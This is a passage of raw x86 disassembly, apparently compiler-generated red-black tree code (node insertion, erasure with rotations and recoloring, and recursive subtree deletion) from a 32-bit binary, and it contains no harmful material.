   14f28:	mov    ecx,DWORD PTR [ebp-0x4]
   14f2b:	mov    DWORD PTR [esi+0x4],eax
   14f2e:	mov    eax,DWORD PTR [ecx+0x4]
   14f31:	cmp    DWORD PTR [eax+0x4],edi
   14f34:	jne    0x14fb3
   14f36:	mov    DWORD PTR [eax+0x4],esi
   14f39:	jmp    0x14fc1
   14f3e:	mov    ecx,DWORD PTR [edi+0x8]
   14f41:	cmp    ecx,eax
   14f43:	je     0x14f25
   14f45:	push   ecx
   14f46:	call   0x11254
   14f4b:	mov    ebx,eax
   14f4d:	mov    esi,DWORD PTR [ebx+0x8]
   14f50:	cmp    ebx,edi
   14f52:	je     0x14f25
   14f54:	mov    eax,DWORD PTR [ebp-0x8]
   14f57:	mov    DWORD PTR [eax+0x4],ebx
   14f5a:	mov    eax,DWORD PTR [edi]
   14f5c:	mov    DWORD PTR [ebx],eax
   14f5e:	cmp    ebx,DWORD PTR [edi+0x8]
   14f61:	jne    0x14f68
   14f63:	mov    DWORD PTR [esi+0x4],ebx
   14f66:	jmp    0x14f7f
   14f68:	mov    eax,DWORD PTR [ebx+0x4]
   14f6b:	mov    DWORD PTR [esi+0x4],eax
   14f6e:	mov    eax,DWORD PTR [ebx+0x4]
   14f71:	mov    DWORD PTR [eax],esi
   14f73:	mov    eax,DWORD PTR [edi+0x8]
   14f76:	mov    DWORD PTR [ebx+0x8],eax
   14f79:	mov    eax,DWORD PTR [edi+0x8]
   14f7c:	mov    DWORD PTR [eax+0x4],ebx
   14f7f:	mov    eax,DWORD PTR [ebp-0x4]
   14f82:	mov    eax,DWORD PTR [eax+0x4]
   14f85:	cmp    DWORD PTR [eax+0x4],edi
   14f88:	jne    0x14f8f
   14f8a:	mov    DWORD PTR [eax+0x4],ebx
   14f8d:	jmp    0x14f9d
   14f8f:	mov    eax,DWORD PTR [edi+0x4]
   14f92:	cmp    DWORD PTR [eax],edi
   14f94:	jne    0x14f9a
   14f96:	mov    DWORD PTR [eax],ebx
   14f98:	jmp    0x14f9d
   14f9a:	mov    DWORD PTR [eax+0x8],ebx
   14f9d:	mov    eax,DWORD PTR [edi+0x4]
   14fa0:	mov    DWORD PTR [ebx+0x4],eax
   14fa3:	mov    eax,DWORD PTR [ebx+0x70]
   14fa6:	mov    ecx,DWORD PTR [edi+0x70]
   14fa9:	mov    DWORD PTR [ebx+0x70],ecx
   14fac:	mov    DWORD PTR [edi+0x70],eax
   14faf:	mov    ebx,edi
   14fb1:	jmp    0x15014
   14fb3:	mov    eax,DWORD PTR [edi+0x4]
   14fb6:	cmp    DWORD PTR [eax],edi
   14fb8:	jne    0x14fbe
   14fba:	mov    DWORD PTR [eax],esi
   14fbc:	jmp    0x14fc1
   14fbe:	mov    DWORD PTR [eax+0x8],esi
   14fc1:	mov    eax,DWORD PTR [ecx+0x4]
   14fc4:	mov    DWORD PTR [ebp-0x8],eax
   14fc7:	cmp    DWORD PTR [eax],edi
   14fc9:	jne    0x14feb
   14fcb:	mov    edx,DWORD PTR [edi+0x8]
   14fce:	cmp    edx,DWORD PTR ds:0x7f8c0
   14fd4:	jne    0x14fdd
   14fd6:	mov    edx,DWORD PTR [edi+0x4]
   14fd9:	mov    DWORD PTR [eax],edx
   14fdb:	jmp    0x14feb
   14fdd:	push   esi
   14fde:	call   0x11254
   14fe3:	mov    ecx,DWORD PTR [ebp-0x8]
   14fe6:	mov    DWORD PTR [ecx],eax
   14fe8:	mov    ecx,DWORD PTR [ebp-0x4]
   14feb:	mov    eax,DWORD PTR [ecx+0x4]
   14fee:	mov    DWORD PTR [ebp-0x8],eax
   14ff1:	cmp    DWORD PTR [eax+0x8],edi
   14ff4:	jne    0x15014
   14ff6:	mov    ecx,DWORD PTR [edi]
   14ff8:	cmp    ecx,DWORD PTR ds:0x7f8c0
   14ffe:	jne    0x15008
   15000:	mov    ecx,DWORD PTR [edi+0x4]
   15003:	mov    DWORD PTR [eax+0x8],ecx
   15006:	jmp    0x15014
   15008:	push   esi
   15009:	call   0x11232
   1500e:	mov    ecx,DWORD PTR [ebp-0x8]
   15011:	mov    DWORD PTR [ecx+0x8],eax
   15014:	xor    edi,edi
   15016:	inc    edi
   15017:	cmp    DWORD PTR [ebx+0x70],edi
   1501a:	jne    0x15131
   15020:	jmp    0x150df
   15025:	cmp    DWORD PTR [esi+0x70],edi
   15028:	jne    0x1512e
   1502e:	mov    eax,DWORD PTR [esi+0x4]
   15031:	cmp    esi,DWORD PTR [eax]
   15033:	jne    0x150aa
   15035:	mov    eax,DWORD PTR [eax+0x8]
   15038:	cmp    DWORD PTR [eax+0x70],0x0
   1503c:	jne    0x15056
   1503e:	mov    DWORD PTR [eax+0x70],edi
   15041:	mov    eax,DWORD PTR [esi+0x4]
   15044:	and    DWORD PTR [eax+0x70],0x0
   15048:	push   DWORD PTR [esi+0x4]
   1504b:	call   0x12fd4
   15050:	mov    eax,DWORD PTR [esi+0x4]
   15053:	mov    eax,DWORD PTR [eax+0x8]
   15056:	mov    ecx,DWORD PTR [eax]
   15058:	cmp    DWORD PTR [ecx+0x70],edi
   1505b:	jne    0x15065
   1505d:	mov    ecx,DWORD PTR [eax+0x8]
   15060:	cmp    DWORD PTR [ecx+0x70],edi
   15063:	je     0x150d8
   15065:	mov    ecx,DWORD PTR [eax+0x8]
   15068:	cmp    DWORD PTR [ecx+0x70],edi
   1506b:	jne    0x15085
   1506d:	mov    ecx,DWORD PTR [eax]
   1506f:	mov    DWORD PTR [ecx+0x70],edi
   15072:	mov    ecx,DWORD PTR [ebp-0x4]
   15075:	and    DWORD PTR [eax+0x70],0x0
   15079:	push   eax
   1507a:	call   0x13022
   1507f:	mov    eax,DWORD PTR [esi+0x4]
   15082:	mov    eax,DWORD PTR [eax+0x8]
   15085:	mov    ecx,DWORD PTR [esi+0x4]
   15088:	mov    ecx,DWORD PTR [ecx+0x70]
   1508b:	mov    DWORD PTR [eax+0x70],ecx
   1508e:	mov    ecx,DWORD PTR [esi+0x4]
   15091:	mov    DWORD PTR [ecx+0x70],edi
   15094:	mov    eax,DWORD PTR [eax+0x8]
   15097:	mov    ecx,DWORD PTR [ebp-0x4]
   1509a:	mov    DWORD PTR [eax+0x70],edi
   1509d:	push   DWORD PTR [esi+0x4]
   150a0:	call   0x12fd4
   150a5:	jmp    0x1512e
   150aa:	mov    eax,DWORD PTR [eax]
   150ac:	cmp    DWORD PTR [eax+0x70],0x0
   150b0:	jne    0x150c9
   150b2:	mov    DWORD PTR [eax+0x70],edi
   150b5:	mov    eax,DWORD PTR [esi+0x4]
   150b8:	and    DWORD PTR [eax+0x70],0x0
   150bc:	push   DWORD PTR [esi+0x4]
   150bf:	call   0x13022
   150c4:	mov    eax,DWORD PTR [esi+0x4]
   150c7:	mov    eax,DWORD PTR [eax]
   150c9:	mov    ecx,DWORD PTR [eax+0x8]
   150cc:	cmp    DWORD PTR [ecx+0x70],edi
   150cf:	jne    0x150f0
   150d1:	mov    ecx,DWORD PTR [eax]
   150d3:	cmp    DWORD PTR [ecx+0x70],edi
   150d6:	jne    0x150f0
   150d8:	and    DWORD PTR [eax+0x70],0x0
   150dc:	mov    esi,DWORD PTR [esi+0x4]
   150df:	mov    ecx,DWORD PTR [ebp-0x4]
   150e2:	mov    eax,DWORD PTR [ecx+0x4]
   150e5:	cmp    esi,DWORD PTR [eax+0x4]
   150e8:	jne    0x15025
   150ee:	jmp    0x1512e
   150f0:	mov    ecx,DWORD PTR [eax]
   150f2:	cmp    DWORD PTR [ecx+0x70],edi
   150f5:	jne    0x1510f
   150f7:	mov    ecx,DWORD PTR [eax+0x8]
   150fa:	mov    DWORD PTR [ecx+0x70],edi
   150fd:	mov    ecx,DWORD PTR [ebp-0x4]
   15100:	and    DWORD PTR [eax+0x70],0x0
   15104:	push   eax
   15105:	call   0x12fd4
   1510a:	mov    eax,DWORD PTR [esi+0x4]
   1510d:	mov    eax,DWORD PTR [eax]
   1510f:	mov    ecx,DWORD PTR [esi+0x4]
   15112:	mov    ecx,DWORD PTR [ecx+0x70]
   15115:	mov    DWORD PTR [eax+0x70],ecx
   15118:	mov    ecx,DWORD PTR [esi+0x4]
   1511b:	mov    DWORD PTR [ecx+0x70],edi
   1511e:	mov    eax,DWORD PTR [eax]
   15120:	mov    ecx,DWORD PTR [ebp-0x4]
   15123:	mov    DWORD PTR [eax+0x70],edi
   15126:	push   DWORD PTR [esi+0x4]
   15129:	call   0x13022
   1512e:	mov    DWORD PTR [esi+0x70],edi
   15131:	lea    eax,[ebx+0x10]
   15134:	push   eax
   15135:	call   0x13a94
   1513a:	push   ebx
   1513b:	call   0x1d9f8
   15140:	mov    eax,DWORD PTR [ebp-0x4]
   15143:	dec    DWORD PTR [eax+0xc]
   15146:	mov    eax,DWORD PTR [ebp+0x8]
   15149:	pop    ecx
   1514a:	mov    ecx,DWORD PTR [ebp+0xc]
   1514d:	pop    edi
   1514e:	pop    esi
   1514f:	mov    DWORD PTR [eax],ecx
   15151:	pop    ebx
   15152:	leave  
   15153:	ret    0x8
   15156:	int3   
   15157:	int3   
   15158:	int3   
   15159:	int3   
   1515a:	int3   
   1515b:	int3   
   1515c:	mov    edi,edi
   1515e:	push   ebp
   1515f:	mov    ebp,esp
   15161:	push   ebx
   15162:	push   esi
   15163:	push   edi
   15164:	mov    edi,DWORD PTR [ebp+0x8]
   15167:	mov    ebx,ecx
   15169:	mov    esi,edi
   1516b:	cmp    edi,DWORD PTR ds:0x7f8c0
   15171:	je     0x15199
   15173:	push   DWORD PTR [esi+0x8]
   15176:	mov    ecx,ebx
   15178:	call   0x1515c
   1517d:	mov    esi,DWORD PTR [esi]
   1517f:	lea    eax,[edi+0x10]
   15182:	push   eax
   15183:	call   0x13a94
   15188:	push   edi
   15189:	call   0x1d9f8
   1518e:	pop    ecx
   1518f:	mov    edi,esi
   15191:	cmp    esi,DWORD PTR ds:0x7f8c0
   15197:	jne    0x15173
   15199:	pop    edi
   1519a:	pop    esi
   1519b:	pop    ebx
   1519c:	pop    ebp
   1519d:	ret    0x4
   151a0:	int3   
   151a1:	int3   
   151a2:	int3   
   151a3:	int3   
   151a4:	int3   
   151a5:	int3   
   151a6:	mov    edi,edi
   151a8:	push   ebp
   151a9:	mov    ebp,esp
   151ab:	push   ebx
   151ac:	push   esi
   151ad:	mov    esi,DWORD PTR [ebp+0x10]
   151b0:	push   edi
   151b1:	push   0x0
   151b3:	push   esi
   151b4:	mov    edi,ecx
   151b6:	call   0x139a6
   151bb:	push   DWORD PTR [ebp+0x14]
   151be:	mov    ebx,eax
   151c0:	mov    eax,ds:0x7f8c0
   151c5:	mov    DWORD PTR [ebx],eax
   151c7:	mov    eax,ds:0x7f8c0
   151cc:	mov    DWORD PTR [ebx+0x8],eax
   151cf:	lea    eax,[ebx+0x10]
   151d2:	push   eax
   151d3:	call   0x13a76
   151d8:	inc    DWORD PTR [edi+0xc]
   151db:	cmp    esi,DWORD PTR [edi+0x4]
   151de:	je     0x15208
   151e0:	mov    eax,DWORD PTR [ebp+0xc]
   151e3:	cmp    eax,DWORD PTR ds:0x7f8c0
   151e9:	jne    0x15208
   151eb:	lea    eax,[esi+0x10]
   151ee:	push   eax
   151ef:	push   DWORD PTR [ebp+0x14]
   151f2:	call   0x19790
   151f7:	test   al,al
   151f9:	jne    0x15208
   151fb:	mov    DWORD PTR [esi+0x8],ebx
   151fe:	mov    eax,DWORD PTR [edi+0x4]
   15201:	cmp    esi,DWORD PTR [eax+0x8]
   15204:	jne    0x15222
   15206:	jmp    0x15217
   15208:	mov    DWORD PTR [esi],ebx
   1520a:	mov    eax,DWORD PTR [edi+0x4]
   1520d:	cmp    esi,eax
   1520f:	jne    0x1521c
   15211:	mov    DWORD PTR [eax+0x4],ebx
   15214:	mov    eax,DWORD PTR [edi+0x4]
   15217:	mov    DWORD PTR [eax+0x8],ebx
   1521a:	jmp    0x15222
   1521c:	cmp    esi,DWORD PTR [eax]
   1521e:	jne    0x15222
   15220:	mov    DWORD PTR [eax],ebx
   15222:	mov    eax,DWORD PTR [edi+0x4]
   15225:	mov    esi,ebx
   15227:	cmp    ebx,DWORD PTR [eax+0x4]
   1522a:	je     0x152de
   15230:	mov    eax,DWORD PTR [esi+0x4]
   15233:	xor    edx,edx
   15235:	cmp    DWORD PTR [eax+0x70],edx
   15238:	jne    0x152de
   1523e:	mov    ecx,DWORD PTR [eax+0x4]
   15241:	cmp    eax,DWORD PTR [ecx]
   15243:	jne    0x1527f
   15245:	mov    ecx,DWORD PTR [ecx+0x8]
   15248:	cmp    DWORD PTR [ecx+0x70],edx
   1524b:	je     0x15286
   1524d:	cmp    esi,DWORD PTR [eax+0x8]
   15250:	jne    0x1525c
   15252:	mov    esi,eax
   15254:	push   esi
   15255:	mov    ecx,edi
   15257:	call   0x12fd4
   1525c:	mov    eax,DWORD PTR [esi+0x4]
   1525f:	mov    DWORD PTR [eax+0x70],0x1
   15266:	mov    eax,DWORD PTR [esi+0x4]
   15269:	mov    eax,DWORD PTR [eax+0x4]
   1526c:	and    DWORD PTR [eax+0x70],0x0
   15270:	mov    eax,DWORD PTR [esi+0x4]
   15273:	push   DWORD PTR [eax+0x4]
   15276:	mov    ecx,edi
   15278:	call   0x13022
   1527d:	jmp    0x152d2
   1527f:	mov    ecx,DWORD PTR [ecx]
   15281:	cmp    DWORD PTR [ecx+0x70],edx
   15284:	jne    0x152a3
   15286:	mov    edx,eax
   15288:	xor    eax,eax
   1528a:	inc    eax
   1528b:	mov    DWORD PTR [edx+0x70],eax
   1528e:	mov    DWORD PTR [ecx+0x70],eax
   15291:	mov    eax,DWORD PTR [esi+0x4]
   15294:	mov    eax,DWORD PTR [eax+0x4]
   15297:	and    DWORD PTR [eax+0x70],0x0
   1529b:	mov    eax,DWORD PTR [esi+0x4]
   1529e:	mov    esi,DWORD PTR [eax+0x4]
   152a1:	jmp    0x152d2
   152a3:	cmp    esi,DWORD PTR [eax]
   152a5:	jne    0x152b1
   152a7:	mov    esi,eax
   152a9:	push   esi
   152aa:	mov    ecx,edi
   152ac:	call   0x13022
   152b1:	mov    eax,DWORD PTR [esi+0x4]
   152b4:	mov    DWORD PTR [eax+0x70],0x1
   152bb:	mov    eax,DWORD PTR [esi+0x4]
   152be:	mov    eax,DWORD PTR [eax+0x4]
   152c1:	and    DWORD PTR [eax+0x70],0x0
   152c5:	mov    eax,DWORD PTR [esi+0x4]
   152c8:	push   DWORD PTR [eax+0x4]
   152cb:	mov    ecx,edi
   152cd:	call   0x12fd4
   152d2:	mov    eax,DWORD PTR [edi+0x4]
   152d5:	cmp    esi,DWORD PTR [eax+0x4]
   152d8:	jne    0x15230
   152de:	mov    eax,DWORD PTR [edi+0x4]
   152e1:	mov    eax,DWORD PTR [eax+0x4]
   152e4:	pop    edi
   152e5:	mov    DWORD PTR [eax+0x70],0x1
   152ec:	mov    eax,DWORD PTR [ebp+0x8]
   152ef:	pop    esi
   152f0:	mov    DWORD PTR [eax],ebx
   152f2:	pop    ebx
   152f3:	pop    ebp
   152f4:	ret    0x10
   152f7:	int3   
   152f8:	int3   
   152f9:	int3   
   152fa:	int3   
   152fb:	int3   
   152fc:	mov    edi,edi
   152fe:	push   ebp
   152ff:	mov    ebp,esp
   15301:	push   ecx
   15302:	push   ecx
   15303:	push   ebx
   15304:	push   esi
   15305:	mov    DWORD PTR [ebp-0x4],ecx
   15308:	push   edi
   15309:	mov    edi,DWORD PTR [ebp+0xc]
   1530c:	lea    ecx,[ebp+0xc]
   1530f:	call   0x1385c
   15314:	mov    esi,DWORD PTR [edi]
   15316:	mov    eax,ds:0x7f8c4
   1531b:	mov    ebx,edi
   1531d:	mov    DWORD PTR [ebp-0x8],esi
   15320:	cmp    esi,eax
   15322:	jne    0x15340
   15324:	mov    esi,DWORD PTR [edi+0x8]
   15327:	mov    eax,DWORD PTR [ebx+0x4]
   1532a:	mov    ecx,DWORD PTR [ebp-0x4]
   1532d:	mov    DWORD PTR [esi+0x4],eax
   15330:	mov    eax,DWORD PTR [ecx+0x4]
   15333:	cmp    DWORD PTR [eax+0x4],edi
   15336:	jne    0x153b5
   15338:	mov    DWORD PTR [eax+0x4],esi
   1533b:	jmp    0x153c3
   15340:	mov    ecx,DWORD PTR [edi+0x8]
   15343:	cmp    ecx,eax
   15345:	je     0x15327
   15347:	push   ecx
   15348:	call   0x12c9a
   1534d:	mov    ebx,eax
   1534f:	mov    esi,DWORD PTR [ebx+0x8]
   15352:	cmp    ebx,edi
   15354:	je     0x15327
   15356:	mov    eax,DWORD PTR [ebp-0x8]
   15359:	mov    DWORD PTR [eax+0x4],ebx
   1535c:	mov    eax,DWORD PTR [edi]
   1535e:	mov    DWORD PTR [ebx],eax
   15360:	cmp    ebx,DWORD PTR [edi+0x8]
   15363:	jne    0x1536a
   15365:	mov    DWORD PTR [esi+0x4],ebx
   15368:	jmp    0x15381
   1536a:	mov    eax,DWORD PTR [ebx+0x4]
   1536d:	mov    DWORD PTR [esi+0x4],eax
   15370:	mov    eax,DWORD PTR [ebx+0x4]
   15373:	mov    DWORD PTR [eax],esi
   15375:	mov    eax,DWORD PTR [edi+0x8]
   15378:	mov    DWORD PTR [ebx+0x8],eax
   1537b:	mov    eax,DWORD PTR [edi+0x8]
   1537e:	mov    DWORD PTR [eax+0x4],ebx
   15381:	mov    eax,DWORD PTR [ebp-0x4]
   15384:	mov    eax,DWORD PTR [eax+0x4]
   15387:	cmp    DWORD PTR [eax+0x4],edi
   1538a:	jne    0x15391
   1538c:	mov    DWORD PTR [eax+0x4],ebx
   1538f:	jmp    0x1539f
   15391:	mov    eax,DWORD PTR [edi+0x4]
   15394:	cmp    DWORD PTR [eax],edi
   15396:	jne    0x1539c
   15398:	mov    DWORD PTR [eax],ebx
   1539a:	jmp    0x1539f
   1539c:	mov    DWORD PTR [eax+0x8],ebx
   1539f:	mov    eax,DWORD PTR [edi+0x4]
   153a2:	mov    DWORD PTR [ebx+0x4],eax
   153a5:	mov    eax,DWORD PTR [ebx+0x68]
   153a8:	mov    ecx,DWORD PTR [edi+0x68]
   153ab:	mov    DWORD PTR [ebx+0x68],ecx
   153ae:	mov    DWORD PTR [edi+0x68],eax
   153b1:	mov    ebx,edi
   153b3:	jmp    0x15416
   153b5:	mov    eax,DWORD PTR [edi+0x4]
   153b8:	cmp    DWORD PTR [eax],edi
   153ba:	jne    0x153c0
   153bc:	mov    DWORD PTR [eax],esi
   153be:	jmp    0x153c3
   153c0:	mov    DWORD PTR [eax+0x8],esi
   153c3:	mov    eax,DWORD PTR [ecx+0x4]
   153c6:	mov    DWORD PTR [ebp-0x8],eax
   153c9:	cmp    DWORD PTR [eax],edi
   153cb:	jne    0x153ed
   153cd:	mov    edx,DWORD PTR [edi+0x8]
   153d0:	cmp    edx,DWORD PTR ds:0x7f8c4
   153d6:	jne    0x153df
   153d8:	mov    edx,DWORD PTR [edi+0x4]
   153db:	mov    DWORD PTR [eax],edx
   153dd:	jmp    0x153ed
   153df:	push   esi
   153e0:	call   0x12c9a
   153e5:	mov    ecx,DWORD PTR [ebp-0x8]
   153e8:	mov    DWORD PTR [ecx],eax
   153ea:	mov    ecx,DWORD PTR [ebp-0x4]
   153ed:	mov    eax,DWORD PTR [ecx+0x4]
   153f0:	mov    DWORD PTR [ebp-0x8],eax
   153f3:	cmp    DWORD PTR [eax+0x8],edi
   153f6:	jne    0x15416
   153f8:	mov    ecx,DWORD PTR [edi]
   153fa:	cmp    ecx,DWORD PTR ds:0x7f8c4
   15400:	jne    0x1540a
   15402:	mov    ecx,DWORD PTR [edi+0x4]
   15405:	mov    DWORD PTR [eax+0x8],ecx
   15408:	jmp    0x15416
   1540a:	push   esi
   1540b:	call   0x1133a
   15410:	mov    ecx,DWORD PTR [ebp-0x8]
   15413:	mov    DWORD PTR [ecx+0x8],eax
   15416:	xor    edi,edi
   15418:	inc    edi
   15419:	cmp    DWORD PTR [ebx+0x68],edi
   1541c:	jne    0x15533
   15422:	jmp    0x154e1
   15427:	cmp    DWORD PTR [esi+0x68],edi
   1542a:	jne    0x15530
   15430:	mov    eax,DWORD PTR [esi+0x4]
   15433:	cmp    esi,DWORD PTR [eax]
   15435:	jne    0x154ac
   15437:	mov    eax,DWORD PTR [eax+0x8]
   1543a:	cmp    DWORD PTR [eax+0x68],0x0
   1543e:	jne    0x15458
   15440:	mov    DWORD PTR [eax+0x68],edi
   15443:	mov    eax,DWORD PTR [esi+0x4]
   15446:	and    DWORD PTR [eax+0x68],0x0
   1544a:	push   DWORD PTR [esi+0x4]
   1544d:	call   0x112ec
   15452:	mov    eax,DWORD PTR [esi+0x4]
   15455:	mov    eax,DWORD PTR [eax+0x8]
   15458:	mov    ecx,DWORD PTR [eax]
   1545a:	cmp    DWORD PTR [ecx+0x68],edi
   1545d:	jne    0x15467
   1545f:	mov    ecx,DWORD PTR [eax+0x8]
   15462:	cmp    DWORD PTR [ecx+0x68],edi
   15465:	je     0x154da
   15467:	mov    ecx,DWORD PTR [eax+0x8]
   1546a:	cmp    DWORD PTR [ecx+0x68],edi
   1546d:	jne    0x15487
   1546f:	mov    ecx,DWORD PTR [eax]
   15471:	mov    DWORD PTR [ecx+0x68],edi
   15474:	mov    ecx,DWORD PTR [ebp-0x4]
   15477:	and    DWORD PTR [eax+0x68],0x0
   1547b:	push   eax
   1547c:	call   0x1135c
   15481:	mov    eax,DWORD PTR [esi+0x4]
   15484:	mov    eax,DWORD PTR [eax+0x8]
   15487:	mov    ecx,DWORD PTR [esi+0x4]
   1548a:	mov    ecx,DWORD PTR [ecx+0x68]
   1548d:	mov    DWORD PTR [eax+0x68],ecx
   15490:	mov    ecx,DWORD PTR [esi+0x4]
   15493:	mov    DWORD PTR [ecx+0x68],edi
   15496:	mov    eax,DWORD PTR [eax+0x8]
   15499:	mov    ecx,DWORD PTR [ebp-0x4]
   1549c:	mov    DWORD PTR [eax+0x68],edi
   1549f:	push   DWORD PTR [esi+0x4]
   154a2:	call   0x112ec
   154a7:	jmp    0x15530
   154ac:	mov    eax,DWORD PTR [eax]
   154ae:	cmp    DWORD PTR [eax+0x68],0x0
   154b2:	jne    0x154cb
   154b4:	mov    DWORD PTR [eax+0x68],edi
   154b7:	mov    eax,DWORD PTR [esi+0x4]
   154ba:	and    DWORD PTR [eax+0x68],0x0
   154be:	push   DWORD PTR [esi+0x4]
   154c1:	call   0x1135c
   154c6:	mov    eax,DWORD PTR [esi+0x4]
   154c9:	mov    eax,DWORD PTR [eax]
   154cb:	mov    ecx,DWORD PTR [eax+0x8]
   154ce:	cmp    DWORD PTR [ecx+0x68],edi
   154d1:	jne    0x154f2
   154d3:	mov    ecx,DWORD PTR [eax]
   154d5:	cmp    DWORD PTR [ecx+0x68],edi
   154d8:	jne    0x154f2
   154da:	and    DWORD PTR [eax+0x68],0x0
   154de:	mov    esi,DWORD PTR [esi+0x4]
   154e1:	mov    ecx,DWORD PTR [ebp-0x4]
   154e4:	mov    eax,DWORD PTR [ecx+0x4]
   154e7:	cmp    esi,DWORD PTR [eax+0x4]
   154ea:	jne    0x15427
   154f0:	jmp    0x15530
   154f2:	mov    ecx,DWORD PTR [eax]
   154f4:	cmp    DWORD PTR [ecx+0x68],edi
   154f7:	jne    0x15511
   154f9:	mov    ecx,DWORD PTR [eax+0x8]
   154fc:	mov    DWORD PTR [ecx+0x68],edi
   154ff:	mov    ecx,DWORD PTR [ebp-0x4]
   15502:	and    DWORD PTR [eax+0x68],0x0
   15506:	push   eax
   15507:	call   0x112ec
   1550c:	mov    eax,DWORD PTR [esi+0x4]
   1550f:	mov    eax,DWORD PTR [eax]
   15511:	mov    ecx,DWORD PTR [esi+0x4]
   15514:	mov    ecx,DWORD PTR [ecx+0x68]
   15517:	mov    DWORD PTR [eax+0x68],ecx
   1551a:	mov    ecx,DWORD PTR [esi+0x4]
   1551d:	mov    DWORD PTR [ecx+0x68],edi
   15520:	mov    eax,DWORD PTR [eax]
   15522:	mov    ecx,DWORD PTR [ebp-0x4]
   15525:	mov    DWORD PTR [eax+0x68],edi
   15528:	push   DWORD PTR [esi+0x4]
   1552b:	call   0x1135c
   15530:	mov    DWORD PTR [esi+0x68],edi
   15533:	lea    eax,[ebx+0x10]
   15536:	push   eax
   15537:	call   0x13a94
   1553c:	push   ebx
   1553d:	call   0x1d9f8
   15542:	mov    eax,DWORD PTR [ebp-0x4]
   15545:	dec    DWORD PTR [eax+0xc]
   15548:	mov    eax,DWORD PTR [ebp+0x8]
   1554b:	pop    ecx
   1554c:	mov    ecx,DWORD PTR [ebp+0xc]
   1554f:	pop    edi
   15550:	pop    esi
   15551:	mov    DWORD PTR [eax],ecx
   15553:	pop    ebx
   15554:	leave  
   15555:	ret    0x8
   15558:	int3   
   15559:	int3   
   1555a:	int3   
   1555b:	int3   
   1555c:	int3   
   1555d:	int3   
   1555e:	mov    edi,edi
   15560:	push   ebp
   15561:	mov    ebp,esp
   15563:	push   ebx
   15564:	push   esi
   15565:	push   edi
   15566:	mov    edi,DWORD PTR [ebp+0x8]
   15569:	mov    ebx,ecx
   1556b:	mov    esi,edi
   1556d:	cmp    edi,DWORD PTR ds:0x7f8c4
   15573:	je     0x1559b
   15575:	push   DWORD PTR [esi+0x8]
   15578:	mov    ecx,ebx
   1557a:	call   0x1555e
   1557f:	mov    esi,DWORD PTR [esi]
   15581:	lea    eax,[edi+0x10]
   15584:	push   eax
   15585:	call   0x13a94
   1558a:	push   edi
   1558b:	call   0x1d9f8
   15590:	pop    ecx
   15591:	mov    edi,esi
   15593:	cmp    esi,DWORD PTR ds:0x7f8c4
   15599:	jne    0x15575
   1559b:	pop    edi
   1559c:	pop    esi
   1559d:	pop    ebx
   1559e:	pop    ebp
   1559f:	ret    0x4
   155a2:	int3   
   155a3:	int3   
   155a4:	int3   
   155a5:	int3   
   155a6:	int3   
   155a7:	int3   
   155a8:	mov    edi,edi
   155aa:	push   ebp
   155ab:	mov    ebp,esp
   155ad:	push   ebx
   155ae:	push   esi
   155af:	mov    esi,DWORD PTR [ebp+0x10]
   155b2:	push   edi
   155b3:	push   0x0
   155b5:	push   esi
   155b6:	mov    edi,ecx
   155b8:	call   0x1395e
   155bd:	push   DWORD PTR [ebp+0x14]
   155c0:	mov    ebx,eax
   155c2:	mov    eax,ds:0x7f8c4
   155c7:	mov    DWORD PTR [ebx],eax
   155c9:	mov    eax,ds:0x7f8c4
   155ce:	mov    DWORD PTR [ebx+0x8],eax
   155d1:	lea    eax,[ebx+0x10]
   155d4:	push   eax
   155d5:	call   0x13aac
   155da:	inc    DWORD PTR [edi+0xc]
   155dd:	cmp    esi,DWORD PTR [edi+0x4]
   155e0:	je     0x1560a
   155e2:	mov    eax,DWORD PTR [ebp+0xc]
   155e5:	cmp    eax,DWORD PTR ds:0x7f8c4
   155eb:	jne    0x1560a
   155ed:	lea    eax,[esi+0x10]
   155f0:	push   eax
   155f1:	push   DWORD PTR [ebp+0x14]
   155f4:	call   0x19790
   155f9:	test   al,al
   155fb:	jne    0x1560a
   155fd:	mov    DWORD PTR [esi+0x8],ebx
   15600:	mov    eax,DWORD PTR [edi+0x4]
   15603:	cmp    esi,DWORD PTR [eax+0x8]
   15606:	jne    0x15624
   15608:	jmp    0x15619
   1560a:	mov    DWORD PTR [esi],ebx
   1560c:	mov    eax,DWORD PTR [edi+0x4]
   1560f:	cmp    esi,eax
   15611:	jne    0x1561e
   15613:	mov    DWORD PTR [eax+0x4],ebx
   15616:	mov    eax,DWORD PTR [edi+0x4]
   15619:	mov    DWORD PTR [eax+0x8],ebx
   1561c:	jmp    0x15624
   1561e:	cmp    esi,DWORD PTR [eax]
   15620:	jne    0x15624
   15622:	mov    DWORD PTR [eax],ebx
   15624:	mov    eax,DWORD PTR [edi+0x4]
   15627:	mov    esi,ebx
   15629:	cmp    ebx,DWORD PTR [eax+0x4]
   1562c:	je     0x156e0
   15632:	mov    eax,DWORD PTR [esi+0x4]
   15635:	xor    edx,edx
   15637:	cmp    DWORD PTR [eax+0x68],edx
   1563a:	jne    0x156e0
   15640:	mov    ecx,DWORD PTR [eax+0x4]
   15643:	cmp    eax,DWORD PTR [ecx]
   15645:	jne    0x15681
   15647:	mov    ecx,DWORD PTR [ecx+0x8]
   1564a:	cmp    DWORD PTR [ecx+0x68],edx
   1564d:	je     0x15688
   1564f:	cmp    esi,DWORD PTR [eax+0x8]
   15652:	jne    0x1565e
   15654:	mov    esi,eax
   15656:	push   esi
   15657:	mov    ecx,edi
   15659:	call   0x112ec
   1565e:	mov    eax,DWORD PTR [esi+0x4]
   15661:	mov    DWORD PTR [eax+0x68],0x1
   15668:	mov    eax,DWORD PTR [esi+0x4]
   1566b:	mov    eax,DWORD PTR [eax+0x4]
   1566e:	and    DWORD PTR [eax+0x68],0x0
   15672:	mov    eax,DWORD PTR [esi+0x4]
   15675:	push   DWORD PTR [eax+0x4]
   15678:	mov    ecx,edi
   1567a:	call   0x1135c
   1567f:	jmp    0x156d4
   15681:	mov    ecx,DWORD PTR [ecx]
   15683:	cmp    DWORD PTR [ecx+0x68],edx
   15686:	jne    0x156a5
   15688:	mov    edx,eax
   1568a:	xor    eax,eax
   1568c:	inc    eax
   1568d:	mov    DWORD PTR [edx+0x68],eax
   15690:	mov    DWORD PTR [ecx+0x68],eax
   15693:	mov    eax,DWORD PTR [esi+0x4]
   15696:	mov    eax,DWORD PTR [eax+0x4]
   15699:	and    DWORD PTR [eax+0x68],0x0
   1569d:	mov    eax,DWORD PTR [esi+0x4]
   156a0:	mov    esi,DWORD PTR [eax+0x4]
   156a3:	jmp    0x156d4
   156a5:	cmp    esi,DWORD PTR [eax]
   156a7:	jne    0x156b3
   156a9:	mov    esi,eax
   156ab:	push   esi
   156ac:	mov    ecx,edi
   156ae:	call   0x1135c
